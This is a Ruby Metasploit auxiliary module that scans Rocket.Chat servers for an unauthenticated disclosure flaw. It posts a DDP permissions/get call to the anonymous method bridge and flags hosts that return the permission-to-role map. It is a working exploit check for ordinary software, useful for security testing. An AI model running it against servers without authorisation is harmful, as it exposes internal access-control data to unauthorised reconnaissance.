class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat anonymous permissions/get disclosure scanner (VULN-005)',
        'Description' => %q{
          Rocket.Chat is a self-hosted team chat server. The DDP method
          permissions/get answers before any authentication check, and the anonymous
          bridge /api/v1/method.callAnon/permissions-get exposes it over plain HTTP,
          so an unauthenticated caller reads the whole permission-to-role map. This
          scanner calls the bridge with no session; a host is vulnerable when the
          response carries the permission documents (the access-permissions entry with
          its roles). It sends no credentials and changes nothing.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/method.callAnon/permissions-get'])
    ])
  end

  def run_host(ip)
    res = anon_call
    unless res
      vprint_error("#{peer} - No response")
      return
    end

    hit = parse_json(res)['message'].to_s.include?('access-permissions')
    unless hit
      vprint_status("#{peer} - Not vulnerable to VULN-005")
      return
    end

    print_good("#{peer} - Vulnerable: VULN-005")
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-005 confirmed by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def anon_call
    frame = { 'msg' => 'method', 'id' => '1', 'method' => 'permissions/get', 'params' => [] }.to_json
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'data' => { 'message' => frame }.to_json
    })
  end
end
